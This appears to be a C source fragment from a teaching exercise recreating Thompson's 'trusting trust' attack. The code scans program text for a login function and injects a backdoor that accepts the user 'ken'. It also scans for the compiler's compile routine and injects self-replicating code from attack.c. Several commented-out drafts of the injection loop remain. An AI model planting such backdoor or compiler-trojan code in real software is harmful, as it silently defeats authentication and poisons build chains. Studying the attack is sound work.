static char login_sig[] = "int login(char *user) {";


// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
// char* modified_program = malloc(strlen(program) + strlen(login_attack) + 1);

// int i = 0;
// while (i < strlen(program)){
//     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
//         // strncpy(modified_program, program, i + strlen(login_sig));
//         // strcat(modified_program, login_attack);
//         // strcat(modified_program, program + i + strlen(login_sig));
//         for (int j = i; j < i + strlen(login_sig); j++){
//             fprintf(fp, "%c", program[j]);
//         }
//         i += strlen(login_sig);
//         for (int j = 0; j < strlen(login_attack); j++){
//             fprintf(fp, "%c", login_attack[j]);
//         }
//         fprintf(fp, "\n");
//     } else {
//         fprintf(fp, "%c", program[i]);
//     }
//     i++;
// }


// int i = 0;
// static char login_end[] = "does not exist\\n\", user);";
// while (i < strlen(program)){
//     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
//         // strncpy(modified_program, program, i + strlen(login_sig));
//         // strcat(modified_program, login_attack);
//         // strcat(modified_program, program + i + strlen(login_sig));
//         for (int j = i; j < i + strlen(login_sig); j++){
//             fprintf(fp, "%c", program[j]);
//         }
//         i += strlen(login_sig);
//         for (int j = 0; j < strlen(login_attack); j++){
//             fprintf(fp, "%c", login_attack[j]);
//         }
//         fprintf(fp, "\n");
//         while (i < strlen(program)){
//             if (strncmp(program + i, login_end, strlen(login_end)) == 0){
//                 i += strlen(login_end);
//                 fprintf(fp, "%s", "\n");
//                 break;
//             } else {
//                 i++;
//             }
//         }
//         fprintf(fp, "%s", "return 1;");
//     } else {
//         fprintf(fp, "%c", program[i]);
//     }
//     i++;
// }


    

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
static char compile_attack[] 
            = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

int i = 0;
static char compile_end[] = "program);";
static char login_end[] = "does not exist\\n\", user);";
while (i < strlen(program)){
    if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
        // strncpy(modified_program, program, i + strlen(login_sig));
        // strcat(modified_program, login_attack);
        // strcat(modified_program, program + i + strlen(login_sig));
        for (int j = i; j < i + strlen(login_sig); j++){
            fprintf(fp, "%c", program[j]);
        }
        i += strlen(login_sig);
        for (int j = 0; j < strlen(login_attack); j++){
            fprintf(fp, "%c", login_attack[j]);
        }
        fprintf(fp, "\n");
        while (i < strlen(program)){
            if (strncmp(program + i, login_end, strlen(login_end)) == 0){
                i += strlen(login_end);
                fprintf(fp, "%s", "\n");
                break;
            } else {
                i++;
            }
            
        }
        fprintf(fp, "%s", "return 1;");
    } else if (strncmp(program + i, compile_sig, strlen(compile_sig)) == 0){
        for (int j = i; j < i + strlen(compile_sig); j++){
            fprintf(fp, "%c", program[j]);
        }
        i += strlen(compile_sig);
        #include "attack.c"
        fprintf(fp, "%s", prog);

        while (i < strlen(program)){
            if (strncmp(program + i, compile_end, strlen(compile_end)) == 0){
                i += strlen(compile_end);
                break;
            } else {
                i++;
            }
        }
            
        //     for (int j = i; j < i + strlen(compile_sig); j++){
        //     fprintf(fp, "%c", program[j]);
        // }
        // i += strlen(compile_sig);
        // #include "attack.c"
        // fprintf(fp, "%s", prog);
        // fprintf(fp, "%s", "\n");
    } else {
        fprintf(fp, "%c", program[i]);
    }
    i++;
} 